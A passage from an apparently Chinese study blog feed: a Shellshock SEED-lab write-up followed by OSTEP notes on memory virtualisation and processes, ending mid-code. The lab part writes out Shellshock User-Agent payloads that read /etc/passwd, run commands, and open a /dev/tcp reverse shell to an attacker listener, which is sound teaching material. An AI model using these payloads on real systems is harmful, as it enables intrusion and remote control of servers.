请求，可以观察到环境变量</p><p>如果命令有一个纯文本输出，并且希望得到输出的返回，那么输出需要遵循一个协议: 它应该以 Content type: text/print 开始，后面跟一个空行，然后可以放置纯文本输出</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> Content_type: text/plain; <span class="hljs-keyword">echo</span>; <span class="hljs-string">/bin/ls</span> -l<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs awk">root@VM:~<span class="hljs-comment"># cat get_env.sh </span><br><span class="hljs-comment">#!/bin/bash</span><br>curl -A <span class="hljs-string">&quot;my data&quot;</span> -v <span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span><span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>root@VM:~<span class="hljs-comment"># ./get_env.sh </span><br>*   Trying <span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span>:<span class="hljs-number">80</span>...<br>* TCP_NODELAY set<br>* Connected to <span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span> (<span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span>) port <span class="hljs-number">80</span> (<span class="hljs-comment">#0)</span><br>&gt; GET <span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi HTTP/<span class="hljs-number">1.1</span><br>&gt; Host: <span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span><br>&gt; User-Agent: my data<br>&gt; Accept: */*<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>&lt; Date: Thu, <span class="hljs-number">17</span> Nov <span class="hljs-number">2022</span> <span class="hljs-number">14</span>:<span class="hljs-number">43</span>:<span class="hljs-number">42</span> GMT<br>&lt; Server: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)<br>&lt; Vary: Accept-Encoding<br>&lt; Transfer-Encoding: chunked<br>&lt; Content-Type: text/plain<br>&lt; <br>****** Environment Variables ******<br>HTTP_HOST=<span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span><br>HTTP_USER_AGENT=my data<br>HTTP_ACCEPT=*/*<br>PATH=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin:/u</span>sr<span class="hljs-regexp">/local/</span>bin:<span class="hljs-regexp">/usr/</span>sbin:<span class="hljs-regexp">/usr/</span>bin:<span class="hljs-regexp">/sbin:/</span>bin<br>SERVER_SIGNATURE=&lt;address&gt;Apache<span class="hljs-regexp">/2.4.41 (Ubuntu) Server at 10.9.0.80 Port 80&lt;/</span>address&gt;<br>SERVER_SOFTWARE=Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)<br>SERVER_NAME=<span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span><br>SERVER_ADDR=<span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span><br>SERVER_PORT=<span class="hljs-number">80</span><br>REMOTE_ADDR=<span class="hljs-number">10.9</span>.<span class="hljs-number">0.1</span><br>DOCUMENT_ROOT=<span class="hljs-regexp">/var/</span>www/html<br>REQUEST_SCHEME=http<br>CONTEXT_PREFIX=<span class="hljs-regexp">/cgi-bin/</span><br>CONTEXT_DOCUMENT_ROOT=<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/cgi-bin/</span><br>SERVER_ADMIN=webmaster@localhost<br>SCRIPT_FILENAME=<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>REMOTE_PORT=<span class="hljs-number">41716</span><br>GATEWAY_INTERFACE=CGI/<span class="hljs-number">1.1</span><br>SERVER_PROTOCOL=HTTP/<span class="hljs-number">1.1</span><br>REQUEST_METHOD=GET<br>QUERY_STRING=<br>REQUEST_URI=<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>SCRIPT_NAME=<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>* Connection <span class="hljs-comment">#0 to host 10.9.0.80 left intact</span><br></code></pre></td></tr></table></figure><h1 id="get-the-server-to-send-back-the-content-of-the-etc-passwd-file"><a href="#get-the-server-to-send-back-the-content-of-the-etc-passwd-file" class="headerlink" title="get the server to send back the content of the /etc/passwd file"></a>get the server to send back the content of the /etc/passwd file</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;() &#123; echo hello wdnmd;&#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd&quot;</span> www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br><br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br></code></pre></td></tr></table></figure><h1 id="get-the-server-to-tell-you-its-process’-user-ID"><a href="#get-the-server-to-tell-you-its-process’-user-ID" class="headerlink" title="get the server to tell you its process’ user ID"></a>get the server to tell you its process’ user ID</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;() &#123; echo hello wdnmd;&#125;; echo Content_type: text/plain; echo; /bin/id&quot;</span> www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br><br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br></code></pre></td></tr></table></figure><h1 id="get-the-server-to-create-a-file-inside-the-tmp-folder"><a href="#get-the-server-to-create-a-file-inside-the-tmp-folder" class="headerlink" title="get the server to create a file inside the /tmp folder"></a>get the server to create a file inside the /tmp folder</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;() &#123; echo hello wdnmd;&#125;; echo Content_type: text/plain; echo; /bin/touch /tmp/1&quot;</span> www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></code></pre></td></tr></table></figure><h1 id="get-the-server-to-delete-the-file-that-you-just-created-inside-the-tmp-folder"><a href="#get-the-server-to-delete-the-file-that-you-just-created-inside-the-tmp-folder" class="headerlink" title="get the server to delete the file that you just created inside the /tmp folder"></a>get the server to delete the file that you just created inside the /tmp folder</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;() &#123; echo hello wdnmd;&#125;; echo Content_type: text/plain; echo; /bin/rm /tmp/1&quot;</span> www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></code></pre></td></tr></table></figure><h1 id="Question-1-Will-you-be-able-to-steal-the-content-of-the-shadow-file-etc-shadow-from-the-server"><a href="#Question-1-Will-you-be-able-to-steal-the-content-of-the-shadow-file-etc-shadow-from-the-server" class="headerlink" title="Question 1: Will you be able to steal the content of the shadow file /etc/shadow from the server?"></a>Question 1: Will you be able to steal the content of the shadow file /etc/shadow from the server?</h1><p>默认情况下，web服务器使用 Ubuntu 中的 www-data 用户 ID 运行，uid=33(www-data) gid=33(www-data) groups=33(www-data)，因此无法得到影子文件</p><h1 id="Getting-a-Reverse-Shell-via-Shellshock-Attack"><a href="#Getting-a-Reverse-Shell-via-Shellshock-Attack" class="headerlink" title="Getting a Reverse Shell via Shellshock Attack"></a>Getting a Reverse Shell via Shellshock Attack</h1><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><ul><li>-l Listen on a specified port and print any data received</li><li>-v Produce more verbose output.</li><li>-n 直接使用IP地址，而不通过域名服务器</li></ul><p>攻击端运行<code>nc -l 9090 -nv</code>等待reverse shell</p><p>攻击端ip：10.9.0.1，docker中web服务器ip：10.9.0.1</p><p>被攻击端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">  curl -A <span class="hljs-string">&quot;() &#123; echo hello wdnmd;&#125;; echo Content_type: text/plain; echo; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1&quot;</span> www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></code></pre></td></tr></table></figure><ul><li>被攻击端启动一个 bash shell，它的输入来自一个 TCP 连接，输出到同一个 TCP 连接</li><li><code>- i</code>表示交互式的，interactive</li><li> <code>&gt; /dev/tcp/10.0.0.1/9090 shell</code>将输出设备(stdout)被重定向到 TCP 连接到10.0.2.6的端口9090</li><li> <code>0 &lt; &amp; 1</code>: 文件描述符0表示标准输入设备(stdin)。此选项告诉系统使用标准输出设备作为标准输入设备。因为 stdout 已经被重定向到 TCP 连接，所以这个选项基本上表明 shell 程序将从相同的 TCP 连接获取它的输入</li><li> <code>2 &gt; &amp; 1</code>: 文件描述符2表示标准错误 stderr。这会导致错误输出被重定向到 stdout，也即是 TCP 连接</li></ul><h1 id="延伸阅读"><a href="#延伸阅读" class="headerlink" title="延伸阅读"></a>延伸阅读</h1><ul><li><p><a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html</a></p></li><li><p><a href="https://www.zdziarski.com/blog/?p=3905">https://www.zdziarski.com/blog/?p=3905</a></p></li><li><p><a href="https://github.com/jeholliday/shellshock">https://github.com/jeholliday/shellshock</a></p></li><li><p><a href="https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf">https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OSTEP NOTES &amp; HW：虚拟内存</title>
    <link href="/p/591d8b99/"/>
    <url>/p/591d8b99/</url>
    
    <content type="html"><![CDATA[<h1 id="基址加界限机制（base-and-bound）"><a href="#基址加界限机制（base-and-bound）" class="headerlink" title="基址加界限机制（base and bound）"></a>基址加界限机制（base and bound）</h1><p>一个实现虚拟内存的初步机制：基址加界限机制，只需要很少的硬件逻辑，就可以将虚拟地址和基址寄存器加起来，并检查进程产生的地址没有越界</p><ul><li>有时又称为动态重定位（dynamic relocation）</li><li>要求每个 CPU 需要两个硬件寄存器：基址（base）寄存器和界限（bound）寄存<br>器，有时称为限制（limit）寄存器，它们被包含在内存管理单元（Memory Management Unit，MMU）</li><li>这组基址和界限寄存器，让我们<strong>能够将地址空间放在物理内存的任何位置，同时又能确保进程只能访问自己的地址空间</strong></li><li>进程产生的所有内存引用，都会被处理<br>器通过以下方式转换为物理地址：physical address = virtual address + base</li><li>基址寄存器将虚拟地址转换为物理地址</li><li>界限寄存器提供访问保护。进程需要访问超过这个界限或者为负数的虚拟地址，CPU 将触发异常，进程最终可能被终止</li></ul><p><strong>基址加界限机制的弊端是</strong>，容易造成内部碎片（internal fragmentation），指的是已经分配的内存单元内部有未使用的空间（即碎片）</p><p>如果我们将整个地址空间放入物理内存，那么栈和堆之间的空间并没有被进程使用，却依然占用了实际的物理内存</p><p><img src="/image/ostep/Snipaste_2022-09-23_20-48-14.png"></p><p>受限直接访问（Limited Direct Execution，LDE）</p><ul><li>程序指令直接访问硬件，只在一些关键点，如系统调用或时钟中断由操作系统介入保持对硬件的控制</li></ul><p>基于硬件的地址转换（hardware-based address translation）</p><ul><li>硬件对内存访问进行处理（即指令获取、数据读取或写入），将指令中的虚拟（virtual）地址转换为数据实际存储的物理（physical）地址，每次内存引用都会将应用程序的内存引用重定位到内存中实际的位置</li><li>每个进程都具有一个假象：具有机器的、连续的所有的内存，但是本质上进程所拥有的只是虚拟地址，真实的物理地址由操作系统进行分配，从虚拟地址到真实物理地址的过程被称为重定位</li></ul><h1 id="分段（segmentation）"><a href="#分段（segmentation）" class="headerlink" title="分段（segmentation）"></a>分段（segmentation）</h1><p>如上所说，如果我们将整个地址空间放入物理内存，那么栈和堆之间的空间并没有被进程使用，却依然占用了实际的物理内存（可以参照上图）</p><p>怎样支持大地址空间，同时栈和堆之间（可能）有大量空闲空间？为了解决这个问题，分段（segmentation）的概念应运而生</p><p>分段机制需要地址空间内的<strong>每个逻辑段都有一对基址和界限寄存器</strong>，一个段只是地址空间里的一个连续定长的区域（代码、栈和堆），分段能够将不同的段放到不同的物理内存区域，避免了虚拟地址空间中的未使用部分占用物理内存，栈和堆之间没有使用的区域就不需要再分配物理内存</p><p><img src="/image/ostep/Snipaste_2022-09-23_21-14-34.png"></p><p>那么问题又来了，如何知道段内的偏移量？以及地址引用了哪个段？栈和堆的增长方向相反，又该如何偏移？如何表示地址共享从而提升效率？</p><ul><li>可以将虚拟地址表示为[段标志][段内偏移]，用虚拟地址的开头几位段标志来<strong>标识<br>不同的段</strong>，比如：如果前两位是 00，硬件就知道这是属于代码段的地址，用代码段的基址和界限来重定位到正确的物理地址；如果前两位是 01，则是堆地址，使用堆的基址和界限</li><li>段寄存器可以增加硬件标记位实现保护，比如某一位对应是正/反向增长。某一位表示保护位（rwx），检查特定访问是否允许。如果用户进程试图写入只读段，或从非执行段执行指令，硬件会触发异常，让操作系统来处理出错进程</li></ul><p>段寄存器的值（有保护）</p><table><thead><tr><th>段</th><th>基址</th><th>大小</th><th>是否反向增长</th><th>保护</th></tr></thead><tbody><tr><td>代码</td><td>32KB</td><td>2KB</td><td>1</td><td>读—执行</td></tr></tbody></table><p>操作系统的工作</p><ul><li>有了分段之后，操作系统在上下文切换时应该做到，将各个段寄存器中的内容保存和恢复</li><li>每个进程都有自己独立的虚拟地址空间，操作系统必须在进程运行前，确保这些寄存器被正确地赋值</li></ul><p>分段的利与弊</p><ul><li>快速，简单。分段要求的算法很容易，很适合硬件完成，地址转换的开销极小</li><li>代码放在独立的段中，这样的段就可能被多个运行的程序共享</li><li>增加了外部碎片</li></ul><h2 id="保护模式下的分段"><a href="#保护模式下的分段" class="headerlink" title="保护模式下的分段"></a>保护模式下的分段</h2><p>保护模式下的段值只是一个索引，这个索引称为段选择符，即段寄存器的作用是用来选择段描述符，而段描述符包含了段的特征</p><p><strong>段选择符</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs">┌──────────────────────────┬────────┬────────┐<br>│                          │        │        │<br>│                          │        │        │<br>│                          │        │        │<br>│  描述符索引（索引域）      │ TL     │   RPL  │<br>│                          │        │        │<br>│                          │        │        │<br>└──────────────────────────┴────────┴────────┘<br><br></code></pre></td></tr></table></figure><ul><li>索引域：指向描述符表中相应的描述符</li><li>选择域：如果 TI=1，就从局部描述符表中选择相应的描述符，如果TI=0，就从全局描述符表中选择描述符</li><li>RPL(Requestor Privilege Level)：只有请求者特权级RPL高于(数字低于)或等于相应的描述符特权级DPL，描述符才能被存取，这就可以实现一定程度的保护</li></ul><p><strong>段描述符</strong></p><p>每个段由一个段描述符表示，它描述了段的特征。段描述符存放在全局描述符表（GDT）或局部描述符（LDT）表中</p><h1 id="堆上内存分配"><a href="#堆上内存分配" class="headerlink" title="堆上内存分配"></a>堆上内存分配</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">malloc</span><span class="hljs-params">(size t size)</span></span><br></code></pre></td></tr></table></figure><ul><li>size是请求的字节数。函数返回一个指针（没有具体的类型，在 C 语言的术语中是 void 类型），指向size大小（或较大一点）的一块空间，void* 类型可以强制转换为任何其它类型的指针</li><li>分配成功则返回指向被分配内存的指针，失败返回空指针NULL（要注意错误处理）</li><li>malloc后的需要配合free使用，否则会导致内存泄露（虽然进程退出的时候os会回收这部分内存，但是不free仍是一种不好的行为，比如web服务器这种长时间运行的进程的内存泄露是很严重的， 并且很难排查）</li></ul><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-built_in">void</span> free(<span class="hljs-built_in">void</span> *<span class="hljs-keyword">ptr</span>)<br></code></pre></td></tr></table></figure><ul><li>函数接受一个指针，不需要指定这块空间的大小，即可释放对应的内存块</li><li>在只传入一个指针的情况下，库必须能够弄清楚这块内存的大小</li></ul><h2 id="Linux内存布局"><a href="#Linux内存布局" class="headerlink" title="Linux内存布局"></a>Linux内存布局</h2><p><img src="/image/ostep/addrspace.png"></p><h2 id="空闲链表"><a href="#空闲链表" class="headerlink" title="空闲链表"></a>空闲链表</h2><p>空闲链表记录了堆中的哪些空间还没有分配</p><p>假设这是堆中空间布局</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------------------------+</span><br>|        |         |         |<br><span class="hljs-section">| used   |  free | used    |</span><br><span class="hljs-section">+----------------------------+</span><br>0       10        20         30<br></code></pre></td></tr></table></figure><p>那么对应的链表结构为：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                         +------------+                 +-------------+                   <br>                         |<span class="hljs-string">            </span>|<span class="hljs-string">                 </span>|<span class="hljs-string">             </span>|<span class="hljs-string">                   </span><br><span class="hljs-string">                         </span>|<span class="hljs-string">  addr:0    </span>|<span class="hljs-string">                 </span>|<span class="hljs-string">   addr:20   </span>|<span class="hljs-string">                   </span><br><span class="hljs-string"> head     -----------&gt;   </span>|<span class="hljs-string">  len:10    </span>|<span class="hljs-string">    ---------&gt;   </span>|<span class="hljs-string">   len:10    </span>|<span class="hljs-string"> ----------&gt;   NULL</span><br><span class="hljs-string">                         </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                 </span>|<span class="hljs-string">             </span>|<span class="hljs-string">                   </span><br><span class="hljs-string">                         +------------+                 +-------------+                   </span><br><span class="hljs-string"></span><br><span class="hljs-string">typedef struct node_t &#123;</span><br><span class="hljs-string">    int size;</span><br><span class="hljs-string">    struct node_t *next;</span><br><span class="hljs-string">&#125; node_t;</span><br></code></pre></td></tr></table></figure><p>当我们使用malloc(20)在堆中分配出20个字节的空间时，所占用的不仅仅是20字节，因为头块（header）中保存一点额外的信息</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">header_t</span> &#123;</span><br>    <span class="hljs-keyword">int</span> size;<span class="hljs-comment">//所分配空间的大小</span><br>    <span class="hljs-keyword">int</span> magic;<span class="hljs-comment">//幻数，提供完整性检查</span><br>&#125; <span class="hljs-keyword">header_t</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span> </span>&#123;<br>    <span class="hljs-keyword">header_t</span> *hptr = (<span class="hljs-keyword">void</span> *)ptr - <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">header_t</span>);<span class="hljs-comment">//得到头块的位置</span><br>&#125;<br><br><br><br>       hptr<br><br>               ─────────►┌────────────┐<br>                         │            │<br>                         │  size:<span class="hljs-number">20</span>   │  <span class="hljs-keyword">header_t</span><br>                         │            │<br>       ptr     ────────► ├────────────┤<br>                         │            │<br>                         │  magic     │<br>                         │            │<br>                         ├────────────┤<br>                         │            │<br>                         │            │<br>                         │            │<br>                         │            │  allocated bytes<br>                         │            │<br>                         │            │<br>                         └────────────┘<br><br></code></pre></td></tr></table></figure><h1 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>分页：将内存分割成固定大小的单元，每个单元称为一页</p><p>虚拟地址：[虚拟页号][页内偏移]</p><ul><li>将虚拟页映射到物理页，偏移得到物理地址</li><li>虚拟页面号（virtual page number，VPN）</li><li>物理页号（physical page number，PFN）</li></ul><p>页表</p><ul><li>页表基址寄存器（page-table base register）包含页表的起始位置的物理地址</li><li>记录地址空间的每个虚拟页放在物理内存中的位置，是一种数据结构，用于将虚拟地址（或者实际上，是虚拟页号）映射到物理地址（物理帧号）</li><li>每个进程保存一个数据结构，称为页表，页表的主要作用是为地址空间的每个虚拟页面保存地址转换（address translation）</li></ul><h2 id="页表大小的考虑"><a href="#页表大小的考虑" class="headerlink" title="页表大小的考虑"></a>页表大小的考虑</h2><p>对于32 位地址空间，假设一个页大小为4KB，那么：</p><ul><li>一个页有2^12个字节，也即是页内偏移为12位</li><li>2^32 / 2^12 = 2^20 ，也即是需要2^20个页</li></ul><p>因此，对于每个进程，操作系统需要为其维护2^20个页表转换，假设一个转换需要4字节，则每个进程需要2^22字节，也即是4MB的内存，对于多进程来说，这个开销是十分巨大的</p><h2 id="页表项"><a href="#页表项" class="headerlink" title="页表项"></a>页表项</h2><p>最简单的页表实现是线性页表，它的本质是一个数组也即是通过虚拟页号（VPN）检索该数组，并在该索引处查找页表项（PTE），找到期望的物理帧号（PFN）</p><p>一个 x86 架构的示例页表项：<br><img src="/image/ostep/Snipaste_2022-09-26_17-33-23.png"></p><ul><li>存在位（P），表示该页是在物理存储器还是在磁盘上（即它已被换出，swapped out）</li><li>读/写位（R/W）</li><li>访问位（A），有时用于追踪页是否被访问，也用于确定哪些页很受欢迎，因此应该保留在内存中</li><li>脏位（D），页面被带入内存后是否被修改过</li><li>页帧号（PFN）</li></ul><h1 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h1><p>地址转换旁路缓冲存储器 （translation-lookaside buffer，TLB）</p><ul><li>是频繁发生的虚拟到物理地址转换的硬件缓存（cache）</li><li>工作工程：对于每次内存访问，先从虚拟地址中提取页号（VPN），查看tlb是否命中，如果未命中，则访问页表（这会造成巨大的开销）</li></ul><p>页表与TLB的有效位：</p><ul><li>页表中页表项（PTE）若被标记为无效，就意味着该页并没有被进程申请使用，正常运行的程序不应该访问该地址</li><li>TLB 的有效位不同用来标志 TLB 项是不是有效的地址映射</li></ul><p>进程切换时，对于不同的进程，TLB的内容没有意义。倘若上下文切换的时候清空 TLB，那么会导致未命中，造成大量的开销。因此可以给TLB加上地址空间标识符（Address Space Identifier，ASID），从而标志不同的进程</p><p>考虑到换入换出开销，可以替换最近最少使用（least-recently-used，LRU）的项</p>]]></content>
    
    
    <categories>
      
      <category>OSTEP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OSTEP NOTES &amp; HW：进程</title>
    <link href="/p/9e7f5052/"/>
    <url>/p/9e7f5052/</url>
    
    <content type="html"><![CDATA[<h1 id="进程是什么"><a href="#进程是什么" class="headerlink" title="进程是什么"></a>进程是什么</h1><p>进程是操作系统为正在运行的程序提供的抽象</p><p>程序本身是没有生命周期的，它只是存在磁盘上面的一些指令与静态数据，那么操作系统如何创建并启动一个进程？</p><ul><li>将代码和静态数据从磁盘中加载到内存中进程的地址空间<ul><li>早期系统会把所有数据在程序运行前加载完成，现代操作系统使用懒加载，也即是在程序执行期间需要加载的代码或数据片段，才会加载</li></ul></li><li>为程序的运行时栈分配内存</li><li>为堆分配内存</li><li>一些别的初始化任务，比如在 UNIX 系统中，默认情况下每个进程都有 3 个打开的文件描述符（file descriptor），分别对应标准输入、输出和错误</li><li>跳转到程序的main函数入口处运行</li></ul><h1 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h1><p>进程可以处于以下状态之一</p><p><img src="/image/ostep/Snipaste_2022-09-15_14-35-32.png"></p><ul><li>运行 running<ul><li>正在被CPU执行</li></ul></li><li>就绪 ready<ul><li>已经准备好运行，可以转换为运行态</li></ul></li><li>阻塞 blocked <ul><li>一个进程执行了某种操作（比如向磁盘发起I/O请求），他就会被阻塞，直到发生其他事件时才会准备运行</li><li>阻塞态的程序不可以直接转为运行态，需要先转为就绪态才可以转为运行态</li></ul></li><li>初始 initial<ul><li>进程刚被创建</li></ul></li><li>最终 final <ul><li>也被称为僵尸状态</li></ul></li></ul><h1 id="进程的数据结构"><a href="#进程的数据结构" class="headerlink" title="进程的数据结构"></a>进程的数据结构</h1><p>进程的机器状态：</p><ul><li>进程可以访问的内存（地址空间）</li><li>寄存器。许多指令明确地读取或更新寄存器，他们构成了该机器状态的一部分</li></ul><p>以xv6为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// the registers xv6 will save and restore</span><br><span class="hljs-comment">// to stop and subsequently restart a process</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span 